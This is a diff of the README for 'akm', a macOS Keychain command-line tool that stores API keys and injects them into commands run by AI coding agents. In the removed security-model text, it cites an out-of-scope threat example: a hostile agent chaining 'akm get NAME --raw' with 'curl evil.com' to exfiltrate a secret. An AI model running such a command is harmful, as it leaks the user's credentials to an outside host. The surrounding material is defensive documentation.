@@ -1,117 +1,106 @@
-<div align="center">
+# AKM
 
-# akm — agent-driven macOS Keychain CLI for API keys
+Use macOS Keychain secrets in commands without copying their values into scripts, shell history, or agent conversations.
 
-**Stop pasting API keys into `.env` files. Let your AI agent store them in the macOS Keychain and inject them at runtime.**
+```sh
+akm run --only OPENAI_API_KEY -- node server.js
+akm run --only API_KEY=PROJECT_API_KEY -- python script.py
+akm stdin DEPLOY_TOKEN -- gh secret set DEPLOY_TOKEN
+```
 
-<br />
-
-[![Star this repo](https://img.shields.io/github/stars/paperfoot/api-key-manager?style=for-the-badge&logo=github&label=%E2%AD%90%20Star%20this%20repo&color=yellow)](https://github.com/paperfoot/api-key-manager/stargazers)
-&nbsp;&nbsp;
-[![Follow @longevityboris](https://img.shields.io/badge/Follow_%40longevityboris-000000?style=for-the-badge&logo=x&logoColor=white)](https://x.com/longevityboris)
-
-<br />
-
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue?style=for-the-badge)](https://github.com/paperfoot/api-key-manager/blob/main/LICENSE)
-&nbsp;
-[![Platform: macOS](https://img.shields.io/badge/Platform-macOS-lightgrey?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/paperfoot/api-key-manager)
-&nbsp;
-[![CI](https://img.shields.io/github/actions/workflow/status/paperfoot/api-key-manager/ci.yml?branch=main&style=for-the-badge&label=CI)](https://github.com/paperfoot/api-key-manager/actions)
-&nbsp;
-[![Release](https://img.shields.io/github/v/release/paperfoot/api-key-manager?style=for-the-badge&color=brightgreen)](https://github.com/paperfoot/api-key-manager/releases)
-
----
-
-Built for the era of AI coding agents. Every agent with shell access can read `.env`, echo it into a transcript, or commit it to git. `akm` keeps secrets in the macOS Keychain and injects them into child processes only when needed — no plaintext on disk, no copy-paste from a dashboard, no human in the loop.
-
-[Install](#install) &middot; [For AI agents](#for-ai-agents) &middot; [Commands](#commands) &middot; [Security model](#security-model) &middot; [Why akm](#why-akm-vs-env--1password-cli--lkr)
-
-</div>
-
-## What it does
-
-- **Stores keys in the macOS Keychain** instead of `.env` files, so plaintext never sits on disk.
-- **Injects keys into child processes** via `execve` — values do not appear in argv (`ps -ef`), shell history, or scrollback. (Same-user `ps -E` does expose the child's environment; that is consistent with the threat model: a process running as you can already read your keychain.)
-- **Pushes keys to Vercel, GitHub, and Fly** so deployment-secret setup stops being a copy-paste tax.
+AKM is a small local CLI. It needs no account, server, background process, or separate vault. It uses your existing macOS Login Keychain and returns an error when access is unavailable, without opening Keychain dialogs.
 
 ## Install
 
-```bash
+```sh
 brew install paperfoot/tap/akm
 # or
-cargo install --git https://github.com/paperfoot/api-key-manager
+cargo install api-key-manager --locked
 ```
 
-Requires macOS. The Login Keychain backs every operation.
+macOS only, with Apple Silicon and Intel CI coverage. The source requires Rust 1.85 or newer. CI runs on macOS 26 (Apple Silicon) and macOS 15 (Intel); this does not imply every older macOS release has been tested.
 
-## For AI agents
+Optional instructions for Claude Code, Codex, and Gemini:
 
-`akm` exists because AI coding agents (Claude Code, Cursor, Codex, Aider) are now the primary readers of your secrets. A few design choices fall out of that:
+```sh
+akm skill install
+akm skill status
+```
 
-- **Zero prompts.** Every command is non-interactive. Pipe values on stdin, get JSON back.
-- **Discoverable.** `akm agent-info --json` returns a machine-readable manifest of every subcommand, flag, and exit code — agents call it once and know the full surface.
-- **Skill drop-in.** `akm skill install` writes a Claude Code / Codex / Gemini skill so the agent reaches for `akm` automatically instead of suggesting `export OPENAI_API_KEY=...`.
-- **Redacted by default.** `akm run` filters known key prefixes (`sk-`, `ghp_`, `xoxb-`, etc.) out of child stdout/stderr so secrets do not leak back into the agent's context window.
-- **Auditable.** Every read is logged. `akm audit` prints the access trail.
+Updating the binary does not update an already installed skill automatically; run `akm skill install` after an upgrade.
 
-If you are the agent reading this: run `akm agent-info --json` and use it.
+## Store and use a key
 
-## Commands
+Supply new values through your subprocess API's stdin. For example, with a value already held by your application:
 
-| Command | What it does |
+```python
+subprocess.run(["akm", "add", "OPENAI_API_KEY"], input=value, text=True, check=True)
+```
+
+`akm add NAME` replaces an existing value. Names use `[A-Z_][A-Z0-9_]*`. AKM does not prompt for input; add/import with terminal stdin returns an error. Piped input to `add` has trailing CR/LF stripped.
+
+Choose the transport the receiving command accepts:
+
+| Need | Command |
 |---|---|
-| `akm add NAME` | Store a key from stdin or argv. |
-| `akm get NAME` | Retrieve, masked. Pass `--raw` for the unmasked value. |
-| `akm import .env` | Migrate a `.env` file (or stdin) into the Keychain in one command. `--dry-run` to preview. |
-| `akm export` | Raw dump of all/selected keys for backup or migration — `--format env` for shell-safe `NAME=value` lines, `--only KEY,KEY` to filter. Audit-logged. |
-| `akm run --only NAME -- <cmd>` | Run `<cmd>` with named keys injected as env vars. Output redacted. |
-| `akm stdin NAME -- <cmd>` | Write the value to `<cmd>`'s stdin. Works with `vercel env add`, `gh secret set`, `flyctl secrets import`, and any tool that takes a secret on standard input. Output redacted. |
-| `akm list` | Print stored key names (never values). `--long` adds last-updated age per key and flags keys older than 90 days as stale (display only). |
-| `akm rm NAME` | Delete a key. |
-| `akm audit` | Print the append-only access log. |
-| `akm agent-info --json` | Machine-readable capability manifest. |
+| Environment variables | `akm run --only OPENAI_API_KEY,ANTHROPIC_API_KEY -- npm test` |
+| Rename a stored key for one child | `akm run --only API_KEY=PROJECT_API_KEY -- python script.py` |
+| Raw value on stdin | `akm stdin TOKEN -- gh secret set TOKEN` |
+| Shell-quoted `NAME=value` on stdin | `akm stdin TOKEN --format env -- flyctl secrets import` |
+| Find stored names | `akm list --names-only` |
+| Discover one command | `akm agent-info --command run` |
 
-`akm guard install` adds a git pre-commit hook that scans staged files for known key prefixes. `akm skill install` writes the agent skill.
+`run` and `stdin` preserve child exit codes and redact exact supplied values from both child streams, including values split across reads. Normal progress output is forwarded as it arrives. For noninteractive jobs, SIGINT, SIGTERM, and SIGHUP received by AKM are forwarded to the child's process group.
 
-## Why akm vs `.env` / 1Password CLI / lkr
+Redaction pipes the child streams and matches exact bytes; transformed, encoded, or partial values are outside that match. `--no-redact` inherits the original output streams for tools that need a terminal or byte-for-byte output. `--all` explicitly selects every stored key.
 
-| Tool | Backed by | Built for | Plaintext on disk | Agent-native |
-|---|---|---|---|---|
-| `.env` files | filesystem | humans | yes | no |
-| `op` (1Password CLI) | 1Password vault | humans + teams | no | partial |
-| `lkr` | macOS Keychain | humans | no | no |
-| **`akm`** | macOS Keychain | **AI agents** | **no** | **yes** |
+## Output contract
 
-`akm` is not a 1Password replacement. It is the layer between a coding agent and the secrets that agent needs to do its job on a single developer's Mac.
+- Commands return JSON automatically when stdout is piped, or with `--json`. Success uses the existing `{"version":"1","status":"ok","data":...}` envelope.
+- Errors go to **stderr**, include a code and recovery suggestion, and leave stdout available for data.
+- `run` and `stdin` forward child output without a completion message by default. Explicit `--json` adds a completion envelope to stderr, after any child stderr.
+- `--help` and `--version` remain plain text. `list --names-only` explicitly produces one name per line.
+- Exit codes: `0` success, `1` runtime failure, `3` bad input, `6` missing key. Wrappers preserve the child's code (or `128 + signal`), so interpret it in the command's context.
 
-## Security model
+`get --raw` means **unmasked**, not plain-text output: it still returns a JSON envelope when piped. Prefer `run` or `stdin` for ordinary credential use. `get --raw` and `export` intentionally expose values for requested retrieval or backup.
 
-**In scope:** plaintext `.env` files on disk, keys in shell history, keys in `ps -ef` argv listings, keys committed to git by an overeager agent, keys re-appearing in agent transcript context, build-tool printouts leaking secrets.
+## Other commands
 
-**Out of scope:** malware running as your user; a hostile agent that runs `akm get NAME --raw && curl evil.com`; same-user `ps -E` of an `akm run` child (the env IS the transport). Those threats need a different tool. Every access is logged to `~/.akm/audit.log` (mode 0600) so you can review the trail after the fact.
+| Command | Behavior |
+|---|---|
+| `akm get NAME` | Show a masked value. |
+| `akm list --long` | Show names and last-write ages recorded in the audit log. |
+| `akm import .env --dry-run` | Preview names and skipped lines without accessing Keychain. |
+| `akm import .env` | Import literal dotenv values; never execute substitutions or delete the source. |
+| `akm export --only NAME --format env` | Export raw values with shell quoting; AKM can import this format. |
+| `akm rm NAME` | Remove a key; already absent succeeds. |
+| `akm audit --limit 50` | Read the latest complete audit records. |
+| `akm guard install` | Install an optional staged-secret hook, preserving existing hooks and symlinks. |
+| `akm guard uninstall` | Remove only an unchanged AKM-owned hook. |
+| `akm guard scan` | Scan staged content for known prefixes followed by token-like text. |
 
-**Retrieval by design.** Keys are never locked away from you: `akm get --raw` and `akm export` return plaintext with zero prompts — no Touch ID, no confirmation dialogs, no master password. The control is the audit trail, not an access gate. This is a deliberate stance for agent-driven workflows: a human-approval prompt in an autonomous loop is either a denial of service or trained-away noise. If your threat model needs hardware-backed approval per read, use a different tool.
+Check an import's `skipped` entries and validate your replacement configuration before removing its source. Import is not transactional: a Keychain error can leave earlier entries stored. The optional guard is a heuristic, not a complete secret scanner; it does not flag bare prefix examples such as `sk-...`.
 
-## Contributing
+## macOS access and audit
 
-Issues and PRs welcome. Keep changes scoped — one bug or one feature per PR. Run `cargo test` before submitting.
+Keep `HOME` set to your actual macOS account home when using Keychain. If AKM reports `keychain_unavailable`, check the existing Login Keychain in Keychain Access and unlock it if needed. AKM never resets a Keychain, changes its access controls, or disables system-wide security prompts. Dialog suppression is limited to the AKM process.
 
-## License
+AKM keeps the existing file-based Keychain backend so existing items remain accessible. Apple's data-protection Keychain has different code-signing and entitlement requirements; switching backends would require a separate migration.
 
-MIT. See [LICENSE](LICENSE).
+Successful operations and subprocess lifecycles are recorded in `~/.akm/audit.log` with mode `0600`, using names and metadata, never secret values or complete child arguments. Logs are best effort: failed lookups before execution and forced kills may have no terminal record. The log is writable by the same user and is not a tamper-proof access control.
 
----
+AKM reduces accidental disclosure. A process running as your user can still retrieve keys, and child environment variables are accessible to same-user inspection. It does not provide isolation from an agent you have allowed to execute arbitrary commands as you.
 
-<div align="center">
+## Development
 
-Built by [Boris Djordjevic](https://github.com/longevityboris) at [Paperfoot AI](https://paperfoot.com)
+```sh
+cargo fmt --check
+cargo clippy --all-targets --all-features --locked -- -D warnings
+cargo test --locked
+```
 
-<br />
+Integration tests create and remove uniquely named synthetic Keychain entries. Preserve the real `HOME`; redirecting it can hide macOS Keychain configuration. A dedicated regression verifies that unavailable Keychain access fails without a dialog.
 
-**If `akm` is useful to you:**
+See [the September 2026 review](docs/review-2026-09-16.md) for usage evidence, changes, and validation scope.
 
-[![Star this repo](https://img.shields.io/github/stars/paperfoot/api-key-manager?style=for-the-badge&logo=github&label=%E2%AD%90%20Star%20this%20repo&color=yellow)](https://github.com/paperfoot/api-key-manager/stargazers)
-&nbsp;&nbsp;
-[![Follow @longevityboris](https://img.shields.io/badge/Follow_%40longevityboris-000000?style=for-the-badge&logo=x&logoColor=white)](https://x.com/longevityboris)
-
-</div>
+MIT. Built by [Paperfoot](https://paperfoot.com).
